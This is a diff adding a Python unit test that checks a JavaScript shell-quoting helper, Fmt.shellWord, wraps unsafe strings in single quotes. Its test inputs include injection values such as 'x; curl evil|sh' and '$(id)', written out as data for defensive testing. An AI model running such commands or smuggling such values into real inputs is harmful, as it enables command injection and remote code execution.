@@ -201,5 +201,34 @@ class TestMacOnlySidebar(unittest.TestCase):
             self.assertEqual((out["rendered"], out["replaced"]), (["overview"], []), hash_)
 
 
+
+FORMAT_JS = APP_JS.with_name("format.js")
+
+
+@unittest.skipUnless(shutil.which("node"), "node is not installed")
+class TestShellWord(unittest.TestCase):
+    """Fmt.shellWord: the attach and resume lines people paste into a
+    shell quote anything that isn't a plain word."""
+
+    def word(self, value):
+        src = (FORMAT_JS.read_text(encoding="utf-8")
+               + "\nprocess.stdout.write(JSON.stringify(Fmt.shellWord("
+               + json.dumps(value) + ")));\n")
+        done = subprocess.run(["node", "-e", src], capture_output=True,
+                              text=True, timeout=30)
+        self.assertEqual(done.returncode, 0, done.stderr)
+        return json.loads(done.stdout)
+
+    def test_plain_words_stay_bare(self):
+        for value in ("qv-0123abcd", "claude", "/a/b-c.d", "--resume=x"):
+            self.assertEqual(self.word(value), value)
+
+    def test_shell_syntax_is_single_quoted(self):
+        self.assertEqual(self.word("x; curl evil|sh"), "'x; curl evil|sh'")
+        self.assertEqual(self.word("$(id)"), "'$(id)'")
+        self.assertEqual(self.word("it's"), "'it'\\''s'")
+        self.assertEqual(self.word(""), "''")
+
+
 if __name__ == "__main__":
     unittest.main()
